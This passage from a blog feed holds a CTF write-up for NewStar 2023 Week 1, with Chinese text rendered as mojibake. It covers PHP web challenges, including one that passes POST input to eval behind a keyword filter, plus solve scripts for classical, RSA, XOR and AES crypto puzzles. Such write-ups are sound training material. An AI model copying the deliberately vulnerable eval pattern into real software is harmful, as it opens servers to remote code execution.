class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 5=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$_POST</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$var</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$var</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$var</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5-1&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$flag5</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5-2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926125720157.png" alt="image-20230926125720157"></p><p>ç»•è¿‡<code>preg_match</code>,é€šè¿‡<code>%00``%5c</code>ç»•è¿‡</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926125430120.png" alt="image-20230926125430120"></p></li><li><p>æœ€åå¾—åˆ°flagï¼š<code>flag&#123;de665d4c-3bbd-44e8-8eba-2b6cfeef881a&#125;</code></p></li></ol><h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h3><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926205925939.png" alt="image-20230926205925939"></p><ol><li><p>é¦–å…ˆè§‚å¯Ÿç»™å‡ºçš„phpä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$password</span>,<span class="number">0</span>,<span class="number">6</span>)===<span class="string">&quot;c4d038&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></li><li><p>å®¡æŸ¥ä»£ç å¾—çŸ¥ï¼šéœ€è¦é€šè¿‡POSTä¼ å‚<code>password</code>å’Œ<code>e_v.a.l</code> </p><p>md5ç¢°æ’å¾—åˆ°ï¼š114514çš„md5å€¼å‰6ä¸ºæ˜¯<code>c4d038</code></p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926211145829.png" alt="image-20230926211145829"></p><p>æ¶‰åŠåˆ°RCEç»•è¿‡ï¼šé€šé…ç¬¦ç»•è¿‡ï¼Œå†…æ•›æ‰§è¡Œ</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926211050969.png" alt="image-20230926211050969"></p></li></ol><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h3><p><code>++++++++[&gt;&gt;++&gt;++++&gt;++++++&gt;++++++++&gt;++++++++++&gt;++++++++++++&gt;++++++++++++++&gt;++++++++++++++++&gt;++++++++++++++++++&gt;++++++++++++++++++++&gt;++++++++++++++++++++++&gt;++++++++++++++++++++++++&gt;++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;++++++.&gt;----.&lt;-----.&gt;-----.&gt;-----.&lt;&lt;&lt;-.&gt;&gt;++..&lt;.&gt;.++++++.....------.&lt;.&gt;.&lt;&lt;&lt;&lt;&lt;+++.&gt;&gt;&gt;&gt;+.&lt;&lt;&lt;+++++++.&gt;&gt;&gt;+.&lt;&lt;&lt;-------.&gt;&gt;&gt;-.&lt;&lt;&lt;+.+++++++.--..&gt;&gt;&gt;&gt;---.-.&lt;&lt;&lt;&lt;-.+++.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;-------.+.&gt;&gt;&gt;&gt;&gt;++.</code></p><p>brainfuckåœ¨çº¿è§£å¯†ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925144213246.png" alt="image-20230925144213246"></p><p><code>flag&#123;Oiiaioooooiai#b7c0b1866fe58e12&#125;</code></p><h3 id="Caesarâ€™s-Secert"><a href="#Caesarâ€™s-Secert" class="headerlink" title="Caesarâ€™s Secert"></a>Caesarâ€™s Secert</h3><p><code>kqfl&#123;hf3x4w&#39;x_h1umjw_n5_a4wd_3fed&#125;</code></p><p>å‡¯æ’’å¯†ç è§£å¯†ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925144342795.png" alt="image-20230925144342795"></p><h3 id="Fence"><a href="#Fence" class="headerlink" title="Fence"></a>Fence</h3><p><code>fa&#123;ereigtepanet6680&#125;lgrodrn_h_litx#8fc3</code></p><p>æ …æ å¯†ç è§£å¯†ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925144031722.png" alt="image-20230925144031722"></p><p><code>flag&#123;reordering_the_plaintext#686f8c03&#125;</code></p><h3 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h3><h4 id="RSAç®—æ³•"><a href="#RSAç®—æ³•" class="headerlink" title="RSAç®—æ³•"></a>RSAç®—æ³•</h4><blockquote><p>RSAç®—æ³•ç”±ä¸¤ä¸ªå¯†é’¥ï¼Œå³å…¬é’¥å’Œç§é’¥ç»„æˆã€‚<br>â€‚â€‚â€‚â€‚1ï¼‰å‡†å¤‡ä¸¤ä¸ªéå¸¸å¤§çš„ç´ æ•° på’Œ q ï¼ˆè½¬æ¢æˆäºŒè¿›åˆ¶å 1024ä¸ªäºŒè¿›åˆ¶ä½æˆ–è€…æ›´å¤šï¼Œä½æ•°è¶Šå¤šè¶Šéš¾ç ´è§£ï¼‰ï¼›<br>â€‚â€‚â€‚â€‚2ï¼‰åˆ©ç”¨å­—ç¬¦ä¸²æ¨¡æ‹Ÿè®¡ç®—å¤§ç´ æ•° p å’Œ q çš„ä¹˜ç§¯ m&#x3D;pqï¼›<br>â€‚â€‚â€‚â€‚3ï¼‰åŒæ ·æ–¹æ³•è®¡ç®—m&#x3D;(p-1)(q-1) ï¼Œè¿™é‡Œçš„ mæ˜¯ n çš„æ¬§æ‹‰å‡½æ•°ï¼›<br>â€‚â€‚â€‚â€‚4ï¼‰æ‰¾åˆ°ä¸€ä¸ªæ•°e (1&lt;e&lt;m)æ»¡è¶³ gcd(m,e)&#x3D;1ï¼ˆå³ e å’Œ m äº’ç´ ï¼‰ï¼›<br>â€‚â€‚â€‚â€‚5ï¼‰è®¡ç®— e åœ¨æ¨¡ m åŸŸä¸Šçš„é€†å…ƒd ï¼ˆå³æ»¡è¶³ed mod m &#x3D;1 ï¼‰ï¼›<br>â€‚â€‚â€‚â€‚6ï¼‰è‡³æ­¤ï¼Œå…¬é’¥å’Œç§é’¥ç”Ÿæˆå®Œæ¯•ï¼š (n,e)ä¸ºå…¬é’¥ï¼Œ (n,d)ä¸ºç§é’¥ï¼›</p></blockquote><p><strong>åŠ å¯†ï¼š</strong>â€‚å¯¹äºæ˜æ–‡xï¼Œç”¨å…¬é’¥ (n,e)å¯¹ x åŠ å¯†çš„è¿‡ç¨‹ï¼Œå°±æ˜¯å°† x è½¬æ¢æˆæ•°å­—ï¼ˆå­—ç¬¦ä¸²çš„è¯å–å…¶ ASCIIç æˆ–è€… unicode å€¼ï¼‰ï¼Œç„¶åé€šè¿‡å¹‚å–æ¨¡è®¡ç®—å‡ºy ï¼Œå…¶ä¸­ yå°±æ˜¯å¯†æ–‡ï¼›</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230927095332177.png" alt="image-20230927095332177"></p><p><strong>è§£å¯†ï¼š</strong>å¯¹äºå¯†æ–‡y ï¼Œç”¨ç§é’¥ (n,d) å¯¹ y è¿›è¡Œè§£å¯†çš„è¿‡ç¨‹å’ŒåŠ å¯†ç±»ä¼¼ï¼ŒåŒæ ·æ˜¯è®¡ç®—å¹‚å–æ¨¡ï¼›</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230927095404116.png" alt="image-20230927095404116"></p><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_prime</span>(<span class="params">n</span>):</span><br><span class="line">    res = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        res *= getPrime(n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n = gen_prime(<span class="number">32</span>)</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">    <span class="built_in">print</span>(n)</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment"># 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span></span><br><span class="line"><span class="comment"># 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></span><br></pre></td></tr></table></figure><p>ç»è¿‡å¤§ç´ æ•°åˆ†è§£ï¼š<code>17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</code></p><p>èƒ½åˆ†è§£æˆï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">2217990919&lt;10&gt; </span><br><span class="line">2338725373&lt;10&gt; </span><br><span class="line">2370292207&lt;10&gt; </span><br><span class="line">2463878387&lt;10&gt; </span><br><span class="line">2706073949&lt;10&gt; </span><br><span class="line">2794985117&lt;10&gt; </span><br><span class="line">2804303069&lt;10&gt; </span><br><span class="line">2923072267&lt;10&gt; </span><br><span class="line">2970591037&lt;10&gt; </span><br><span class="line">3207148519&lt;10&gt; </span><br><span class="line">3654864131&lt;10&gt; </span><br><span class="line">3831680819&lt;10&gt; </span><br><span class="line">3939901243&lt;10&gt; </span><br><span class="line">4093178561&lt;10&gt; </span><br><span class="line">4278428893&lt;10&gt;</span><br></pre></td></tr></table></figure><p>æ ¹æ®ç»™å‡ºçš„æ–‡ä»¶ å†™å‡ºè§£ç è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…¬é’¥e</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¬§æ‹‰å‡½æ•°eular euler = (p - 1) * (q - 1)</span></span><br><span class="line">num = [<span class="number">2217990919</span>, <span class="number">2338725373</span>, <span class="number">2370292207</span>, <span class="number">2463878387</span>,<span class="number">2706073949</span>, <span class="number">2794985117</span>, <span class="number">2804303069</span>, <span class="number">2923072267</span>,</span><br><span class="line">       <span class="number">2970591037</span>, <span class="number">3207148519</span>, <span class="number">3654864131</span>, <span class="number">3831680819</span>,<span class="number">3939901243</span>, <span class="number">4093178561</span>, <span class="number">4278428893</span>]</span><br><span class="line">eular = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> num:</span><br><span class="line">    eular = eular * (i - <span class="number">1</span>)</span><br><span class="line"><span class="comment"># print(eular)</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span></span><br><span class="line">c = <span class="number">14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></span><br><span class="line"><span class="comment"># ç§é’¥d</span></span><br><span class="line">d = gmpy2.invert(e, eular)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br></pre></td></tr></table></figure><h3 id="babyencoding"><a href="#babyencoding" class="headerlink" title="babyencoding"></a>babyencoding</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">part 1 of flag: ZmxhZ3tkYXp6bGluZ19lbmNvZGluZyM0ZTBhZDQ=</span><br><span class="line">part 2 of flag: MYYGGYJQHBSDCZJRMQYGMMJQMMYGGN3BMZSTIMRSMZSWCNY=</span><br><span class="line">part 3 of flag: =8S4U,3DR8SDY,C`S-F5F-C(S,S&lt;R-C`Q9F8S87T`</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°é¢˜ç›® å¾—çŸ¥ï¼šflagç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆ </p><ol><li><p><code>part 1 of flagï¼š</code><strong>base64</strong>  flag{dazzling_encoding#4e0ad4</p></li><li><p><code>part 2 of flag:</code><strong>base32</strong>   f0ca08d1e1d0f10c0c7afe422fea7</p></li><li><p><code>part 3 of flag: </code><strong>UUencode</strong>  c55192c992036ef623372601ff3a}</p></li></ol><blockquote><p>flag: flag{dazzling_encoding#4e0ad4f0ca08d1e1d0f10c0c7afe422fea7c55192c992036ef623372601ff3a}</p></blockquote><hr><h4 id="UUencode"><a href="#UUencode" class="headerlink" title="UUencode"></a>UUencode</h4><p>â€‹<strong>ç®€è¿°ï¼š</strong></p><p>â€‹UUencodeæ˜¯ä¸€ç§äºŒè¿›åˆ¶åˆ°æ–‡å­—çš„ç¼–ç ï¼Œæœ€æ—©åœ¨unixé‚®ä»¶ç³»ç»Ÿä¸­ä½¿ç”¨ï¼Œå…¨ç§°ï¼šUnix-to-Unix  encodingï¼ŒUUencodeå°†è¾“å…¥æ–‡æœ¬ä»¥æ¯ä¸‰ä¸ªå­—èŠ‚ä¸ºå•ä½è¿›è¡Œç¼–ç ï¼Œå¦‚æœæœ€åå‰©ä¸‹çš„èµ„æ–™å°‘äºä¸‰ä¸ªå­—èŠ‚ï¼Œä¸å¤Ÿçš„éƒ¨ä»½ç”¨é›¶è¡¥é½ã€‚ä¸‰ä¸ªå­—èŠ‚å…±æœ‰24ä¸ªBitï¼Œä»¥6-bitä¸ºå•ä½åˆ†ä¸º4ä¸ªç»„ï¼Œæ¯ä¸ªç»„ä»¥åè¿›åˆ¶æ¥è¡¨ç¤ºæ‰€å‡ºç°çš„å­—èŠ‚çš„æ•°å€¼ã€‚è¿™ä¸ªæ•°å€¼åªä¼šè½åœ¨0åˆ°63ä¹‹é—´ã€‚ç„¶åå°†æ¯ä¸ªæ•°åŠ ä¸Š32ï¼Œæ‰€äº§ç”Ÿçš„ç»“æœåˆšå¥½è½åœ¨ASCIIå­—ç¬¦é›†ä¸­å¯æ‰“å°å­—ç¬¦ï¼ˆ32-ç©ºç™½â€¦95-åº•çº¿ï¼‰çš„èŒƒå›´ä¹‹ä¸­ã€‚</p><p>â€‹<strong>ä¸¾ä¾‹ï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ˜æ–‡ï¼šhello,world.</span><br><span class="line">å¯†æ–‡ï¼š,:&amp;5L;&amp;\L=V]R;&amp;0N</span><br></pre></td></tr></table></figure><p>â€‹<strong>åœ¨çº¿è§£å¯†&amp;å·¥å…·</strong>ï¼š</p><p><a href="http://www.hiencode.com/uu.html">http://www.hiencode.com/uu.html</a></p><h3 id="babyxor"><a href="#babyxor" class="headerlink" title="babyxor"></a>babyxor</h3><p>é¢˜ç›®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ciphertext = []</span><br><span class="line">flag = <span class="string">&#x27;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&#x27;</span></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> flag:</span><br><span class="line">    ciphertext.append(f ^ key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(ciphertext).<span class="built_in">hex</span>())</span><br><span class="line"><span class="comment"># e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2</span></span><br></pre></td></tr></table></figure><p>è§£å¯†è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> xor(<span class="built_in">bytes</span>([i]), ciphertext):</span><br><span class="line">        <span class="built_in">print</span>(xor(<span class="built_in">bytes</span>([i]), ciphertext))</span><br></pre></td></tr></table></figure><h3 id="babyaes"><a href="#babyaes" class="headerlink" title="babyaes"></a>babyaes</h3><p>é¢˜ç›®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># from flag import flag</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> data + <span class="string">b&quot;&quot;</span>.join([<span class="string">b&#x27;\x00&#x27;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span> - <span class="built_in">len</span>(data))])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag_ = pad(flag)</span><br><span class="line">    key = os.urandom(<span class="number">16</span>) * <span class="number">2</span></span><br><span class="line">    iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(bytes_to_long(key) ^ bytes_to_long(iv) ^ <span class="number">1</span>)</span><br><span class="line">    aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    enc_flag = aes.encrypt(flag_)</span><br><span class="line">    <span class="built_in">print</span>(enc_flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="comment"># 3657491768215750635844958060963805125333761387746954618540958489914964573229</span></span><br><span class="line"><span class="comment"># b&#x27;&gt;]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i&#x27;</span></span><br></pre></td></tr></table></figure><p>è§£é¢˜aesï¼Œæˆ‘ä»¬éœ€è¦<code>å¯†ç key</code>ï¼Œ<code>åç§»é‡iv</code>ï¼Œæ ¹æ®é¢˜ç›®æç¤ºï¼ŒåŠ å¯†æ¨¡å¼æ˜¯<code>AES-CBC</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># from flag import flag</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    xor = <span class="number">3657491768215750635844958060963805125333761387746954618540958489914964573229</span> ^ <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(xor)</span><br><span class="line">    out = long_to_bytes(xor)</span><br><span class="line">    key = out[:<span class="number">16</span>] * <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(key)</span><br><span class="line">    iv = bytes_to_long(key[<span class="number">16</span>:]) ^ bytes_to_long(out[<span class="number">16</span>:])</span><br><span class="line">    iv = long_to_bytes(iv)</span><br><span class="line">    <span class="built_in">print</span>(iv)</span><br><span class="line">    ciphertext = <span class="string">b&#x27;&gt;]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i&#x27;</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    flag = cipher.decrypt(ciphertext)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="comment"># 3657491768215750635844958060963805125333761387746954618540958489914964573229</span></span><br><span class="line"><span class="comment"># b&#x27;&gt;]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NewStar-WriteUp-Week1&quot;&gt;&lt;a href=&quot;#NewStar-WriteUp-Week1&quot; class=&quot;headerlink&quot; title=&quot;NewStar WriteUp Week1&quot;&gt;&lt;/a&gt;NewStar WriteUp Week1&lt;/</summary>
      
    
    
    
    <category term="CTF" scheme="https://iahzl.github.io/categories/CTF/"/>
    
    <category term="NewStar 2023" scheme="https://iahzl.github.io/categories/CTF/NewStar-2023/"/>
    
    
    <category term="ctf" scheme="https://iahzl.github.io/tags/ctf/"/>
    
    <category term="crypto" scheme="https://iahzl.github.io/tags/crypto/"/>
    
    <category term="web" scheme="https://iahzl.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>åŸºäºFlask+websocketå®ç°åœ¨çº¿èŠå¤©ç³»ç»Ÿ</title>
    <link href="https://iahzl.github.io/%E5%9F%BA%E4%BA%8EFlask-websocket%E5%AE%9E%E7%8E%B0%E5%9C%A8%E7%BA%BF%E8%81%8A%E5%A4%A9%E7%B3%BB%E7%BB%9F/"/>
    <id>https://iahzl.github.io/%E5%9F%BA%E4%BA%8EFlask-websocket%E5%AE%9E%E7%8E%B0%E5%9C%A8%E7%BA%BF%E8%81%8A%E5%A4%A9%E7%B3%BB%E7%BB%9F/</id>
    <published>2023-09-19T08:16:22.000Z</published>
    <updated>2023-09-19T08:41:36.961Z</updated>
    
